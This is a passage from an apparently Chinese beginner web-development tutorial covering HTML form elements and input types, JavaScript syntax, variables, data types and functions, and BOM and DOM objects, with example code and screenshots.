<li>textarea: 定义文本域</li>
</ul>
</li>
</ul>
<p>示例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表单<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">    form表单属性: </span></span><br><span class="line"><span class="comment">        action: 表单提交的url, 往何处提交数据 . 如果不指定, 默认提交到当前页面</span></span><br><span class="line"><span class="comment">        method: 表单的提交方式 .</span></span><br><span class="line"><span class="comment">            get: 在url后面拼接表单数据, 比如: ?username=Tom&amp;age=12 , url长度有限制 . 默认值</span></span><br><span class="line"><span class="comment">            post: 在消息体(请求体)中传递的, 参数大小无限制的.</span></span><br><span class="line"><span class="comment">    --&gt;</span>   </span><br><span class="line">	</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get/post&quot;</span>&gt;</span>   #表单提交方式的修改</span><br><span class="line">        用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单中的所有表单项，要想能够正常的采集数据，在提交的时候能提交到服务端，表单项必须指定name属性。 否则，无法提交该表单项。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">用户名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-表单的拓展使用"><a href="#7-表单的拓展使用" class="headerlink" title="7).表单的拓展使用"></a>7).表单的拓展使用</h3><p>在一个表单中，可以存在很多的表单项，而虽然表单项的形式各式各样，但是表单项的标签其实就只有三个，分别是：</p>
<ul>
<li><p>&lt;input&gt;: 表单项 , 通过type属性控制输入形式。</p>
<table>
<thead>
<tr>
<th>type取值</th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>text</td>
<td>默认值，定义单行的输入字段</td>
</tr>
<tr>
<td>password</td>
<td>定义密码字段</td>
</tr>
<tr>
<td>radio</td>
<td>定义单选按钮</td>
</tr>
<tr>
<td>checkbox</td>
<td>定义复选框</td>
</tr>
<tr>
<td>file</td>
<td>定义文件上传按钮</td>
</tr>
<tr>
<td>date&#x2F;time&#x2F;datetime-local</td>
<td>定义日期&#x2F;时间&#x2F;日期时间</td>
</tr>
<tr>
<td>number</td>
<td>定义数字输入框</td>
</tr>
<tr>
<td>email</td>
<td>定义邮件输入框</td>
</tr>
<tr>
<td>hidden</td>
<td>定义隐藏域</td>
</tr>
<tr>
<td>submit &#x2F; reset &#x2F; button</td>
<td>定义提交按钮 &#x2F; 重置按钮 &#x2F; 可点击按钮</td>
</tr>
</tbody></table>
</li>
<li><p>&lt;select&gt;: 定义下拉列表, &lt;option&gt; 定义列表项</p>
</li>
<li><p>&lt;textarea&gt;: 文本域</p>
</li>
</ul>
<p>示例：</p>
<p>创建一个新的表单项的html文件，具体内容如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML-表单项标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- value: 表单项提交的值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">     姓名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">     性别: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span> 男</span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span> 女 <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     爱好: <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span> java <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;game&quot;</span>&gt;</span> game <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sing&quot;</span>&gt;</span> sing <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     图像: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     生日: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birthday&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     时间: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;time&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     日期时间: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">name</span>=<span class="string">&quot;datetime&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     邮箱: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     年龄: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     学历: <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;degree&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>----------- 请选择 -----------<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;3&quot;</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span>博士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">select</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     描述: <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">	 	</span><br><span class="line">     <span class="comment">&lt;!-- 表单常见按钮 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;按钮&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span>   </span><br><span class="line">     <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过浏览器打开上述的表单项html文件，最终展示出的表单信息如下：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d4e6fd6e75794d9e43ad0c6a3d4c6078--0018--image-20231121184043690.png" alt="image-20231121184043690"></p>
<h3 id="7-CSS善用文档"><a href="#7-CSS善用文档" class="headerlink" title="7).CSS善用文档"></a>7).CSS善用文档</h3><p>进入W3C进行查询。即用即查即可</p>
<h2 id="3、js的基本使用"><a href="#3、js的基本使用" class="headerlink" title="3、js的基本使用"></a>3、js的基本使用</h2><h3 id="1-书写语法"><a href="#1-书写语法" class="headerlink" title="1).书写语法"></a>1).书写语法</h3><ul>
<li><p>区分大小写：与 Java 一样，变量名、函数名以及其他一切东西都是区分大小写的</p>
</li>
<li><p>每行结尾的分号可有可无</p>
</li>
<li><p>大括号表示代码块</p>
</li>
<li><p>注释：</p>
<ul>
<li><p>单行注释：&#x2F;&#x2F; 注释内容</p>
</li>
<li><p>多行注释：&#x2F;* 注释内容 *&#x2F;</p>
</li>
</ul>
</li>
</ul>
<p>我们需要借助js中3钟输出语句，来演示书写语法</p>
<table>
<thead>
<tr>
<th>api</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>window.alert()</td>
<td>警告框</td>
</tr>
<tr>
<td>document.write()</td>
<td>在HTML 输出内容</td>
</tr>
<tr>
<td>console.log()</td>
<td>写入浏览器控制台</td>
</tr>
</tbody></table>
<h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2).变量"></a>2).变量</h3><p>书写语法会了，变量是一门编程语言比不可少的，所以接下来我们需要学习js中变量的声明，在js中，变量的声明和java中还是不同的。首先js中主要通过如下3个关键字来声明变量的：</p>
<table>
<thead>
<tr>
<th>关键字</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>var</td>
<td>早期ECMAScript5中用于变量声明的关键字</td>
</tr>
<tr>
<td>let</td>
<td>ECMAScript6中新增的用于变量声明的关键字，相比较var，let只在代码块内生效</td>
</tr>
<tr>
<td>const</td>
<td>声明常量的，常量一旦声明，不能修改</td>
</tr>
</tbody></table>
<p>在js中声明变量还需要注意如下几点：</p>
<ul>
<li>JavaScript 是一门弱类型语言，变量可以存放不同类型的值 。</li>
<li>变量名需要遵循如下规则：<ul>
<li>组成字符可以是任何字母、数字、下划线（_）或美元符号（$）</li>
<li>数字不能开头</li>
<li>建议使用驼峰命名</li>
</ul>
</li>
</ul>
<h3 id="3-数据类型与运算符"><a href="#3-数据类型与运算符" class="headerlink" title="3).数据类型与运算符"></a>3).数据类型与运算符</h3><p>这两个就不用多说了，直接放表格</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>number</td>
<td>数字（整数、小数、NaN(Not a Number)）</td>
</tr>
<tr>
<td>string</td>
<td>字符串，单双引皆可</td>
</tr>
<tr>
<td>boolean</td>
<td>布尔。true，false</td>
</tr>
<tr>
<td>null</td>
<td>对象为空</td>
</tr>
<tr>
<td>undefined</td>
<td>当声明的变量未初始化时，该变量的默认值是 undefined</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>运算规则</th>
<th>运算符</th>
</tr>
</thead>
<tbody><tr>
<td>算术运算符</td>
<td>+ , - , * , &#x2F; , % , ++ , –</td>
</tr>
<tr>
<td>赋值运算符</td>
<td>&#x3D; , +&#x3D; , -&#x3D; , *&#x3D; , &#x2F;&#x3D; , %&#x3D;</td>
</tr>
<tr>
<td>比较运算符</td>
<td>&gt; , &lt; , &gt;&#x3D; , &lt;&#x3D; , !&#x3D; , &#x3D;&#x3D; , &#x3D;&#x3D;&#x3D;   注意     &#x3D;&#x3D; 会进行类型转换，&#x3D;&#x3D;&#x3D; 不会进行类型转换</td>
</tr>
<tr>
<td>逻辑运算符</td>
<td>&amp;&amp; , || , !</td>
</tr>
<tr>
<td>三元运算符</td>
<td>条件表达式 ? true_value: false_value</td>
</tr>
</tbody></table>
<h3 id="4-函数"><a href="#4-函数" class="headerlink" title="4).函数"></a>4).函数</h3><h4 id="①第一种定义方法"><a href="#①第一种定义方法" class="headerlink" title="①第一种定义方法"></a>①第一种定义方法</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> 函数名(参数<span class="number">1</span>,参数<span class="number">2.</span>.)&#123;</span><br><span class="line">    要执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为JavaScript是弱数据类型的语言，所以有如下几点需要注意：</p>
<ul>
<li>形式参数不需要声明类型，并且JavaScript中不管什么类型都是let或者var去声明，加上也没有意义。</li>
<li>返回值也不需要声明类型，直接return即可</li>
</ul>
<h4 id="②第二种定义方法"><a href="#②第二种定义方法" class="headerlink" title="②第二种定义方法"></a>②第二种定义方法</h4><p>第二种可以通过var去定义函数的名字，具体格式如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> functionName = <span class="keyword">function</span> (<span class="params">参数<span class="number">1</span>,参数<span class="number">2.</span>.</span>)&#123;   </span><br><span class="line">	<span class="comment">//要执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他的和第一种方法是相同的</p>
<h3 id="5-BOM对象"><a href="#5-BOM对象" class="headerlink" title="5).BOM对象"></a>5).BOM对象</h3><p>BOM中提供了如下5个对象：</p>
<table>
<thead>
<tr>
<th align="left">对象名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Window</td>
<td align="left">浏览器窗口对象</td>
</tr>
<tr>
<td align="left">Navigator</td>
<td align="left">浏览器对象</td>
</tr>
<tr>
<td align="left">Screen</td>
<td align="left">屏幕对象</td>
</tr>
<tr>
<td align="left">History</td>
<td align="left">历史记录对象</td>
</tr>
<tr>
<td align="left">Location</td>
<td align="left">d地址栏对象</td>
</tr>
</tbody></table>
<p>上述5个对象与浏览器各组成对应的关系如下图所示：</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/4188d3cbe1ed885e474d4ffbe61b3ddd--9adc--image-20231121185953491.png" alt="image-20231121185953491"></p>
<p>主要使用到的是Windows和Location这两个</p>
<h4 id="①Windows对象"><a href="#①Windows对象" class="headerlink" title="①Windows对象"></a>①Windows对象</h4><p>window对象指的是浏览器窗口对象，是JavaScript的全部对象，所以对于window对象，我们可以直接使用，并且对于window对象的方法和属性，我们可以省略window.例如：我们之前学习的alert()函数其实是属于window对象的,其完整的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.alert(&#x27;hello&#x27;);</span><br></pre></td></tr></table></figure>

<p>其可以省略window.  所以可以简写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(&#x27;hello&#x27;)</span><br></pre></td></tr></table></figure>

<p>所以对于window对象的属性和方法，我们都是采用简写的方式。window提供了很多属性和方法，下表列出了常用属性和方法</p>
<p>window对象提供了获取其他BOM对象的属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>history</td>
<td>用于获取history对象</td>
</tr>
<tr>
<td>location</td>
<td>用于获取location对象</td>
</tr>
<tr>
<td>Navigator</td>
<td>用于获取Navigator对象</td>
</tr>
<tr>
<td>Screen</td>
<td>用于获取Screen对象</td>
</tr>
</tbody></table>
<p>也就是说我们要使用location对象，只需要通过代码<code>window.location</code>或者简写<code>location</code>即可使用</p>
<p>window也提供了一些常用的函数，如下表格所示：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>alert()</td>
<td>显示带有一段消息和一个确认按钮的警告框。</td>
</tr>
<tr>
<td>comfirm()</td>
<td>显示带有一段消息以及确认按钮和取消按钮的对话框。</td>
</tr>
<tr>
<td>setInterval()</td>
<td>按照指定的周期（以毫秒计）来调用函数或计算表达式。</td>
</tr>
<tr>
<td>setTimeout()</td>
<td>在指定的毫秒数后调用函数或计算表达式。</td>
</tr>
</tbody></table>
<h4 id="②Location对象"><a href="#②Location对象" class="headerlink" title="②Location对象"></a>②Location对象</h4><p>location是指代浏览器的地址栏对象，对于这个对象，我们常用的是href属性，用于获取或者设置浏览器的地址信息，添加如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取浏览器地址栏信息</span></span><br><span class="line"><span class="title function_">alert</span>(location.<span class="property">href</span>);</span><br><span class="line"><span class="comment">//设置浏览器地址栏信息</span></span><br><span class="line">location.<span class="property">href</span> = <span class="string">&quot;https://www.itcast.cn&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>浏览器效果如下：首先弹框展示浏览器地址栏信息，</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/2fb1b4a2882b8e052bbc146ab2538a5b--a4c9--image-20231121191247946.png" alt="image-20231121191247946"></p>
<p>然后点击确定后，因为我们设置了地址栏信息，所以浏览器跳转到传智首页</p>
<h3 id="6-DOM对象"><a href="#6-DOM对象" class="headerlink" title="6).DOM对象"></a>6).DOM对象</h3><p>HTML中的Element对象可以通过Document对象获取，而Document对象是通过window对象获取的。document对象提供的用于获取Element元素对象的api如下表所示：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>document.getElementById()</td>
<td>根据id属性值获取，返回单个Element对象</td>
</tr>
<tr>
<td>document.getElementsByTagName()</td>
<td>根据标签名称获取，返回Element对象数组</td>
</tr>
<tr>
<td>document.getElementsByName()</td>
<td>根据name属性值获取，返回Element对象数组</td>
</tr>
<tr>
<td>document.getElementsByClassName()</td>
<td>根据class属性值获取，返回Element对象数组</td>
</tr>
</tbody></table>
<p>操作属性</p>
<p>那么获取到标签了，我们如何操作标签的属性呢？通过查询文档资料，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/f44d21e5a1292672353de1d459108e31--a783--image-20231121192858063.png" alt="image-20231121192858063"></p>
<p>得出我们可以通过div标签对象的innerHTML属性来修改标签的内容。此时我们想把页面中的<strong>传智教育替换成传智教育666</strong>，所以要获取2个div中的第一个，所以可以通过下标0获取数组中的第一个div，注释之前的代码，编写如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">div1.<span class="property">innerHTML</span> = <span class="string">&quot;传智教育666&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>浏览器刷新页面，展示效果如下图所示：</p>
<p>浏览器刷新页面，展示效果如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/5db9ab60bdd4f569c18c988a032a4621--5c20--image-20231121192928778.png" alt="image-20231121192928778"></p>
<p> 发现页面内容变成了传智教育666</p>
<p>全部源码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS-对象-DOM<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;img/off.gif&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>传智教育<span class="tag">&lt;/<span class="name">div</span>&gt;</span>   <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;cls&quot;</span>&gt;</span>黑马程序员<span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 电影</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 旅游</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span>&gt;</span> 游戏</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1. 获取Element元素</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.1 获取元素-根据ID获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var img = document.getElementById(&#x27;h1&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// alert(img);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.2 获取元素-根据标签获取 - div</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByTagName(&#x27;div&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//1.3 获取元素-根据name属性获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var ins = document.getElementsByName(&#x27;hobby&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; ins.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(ins[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span 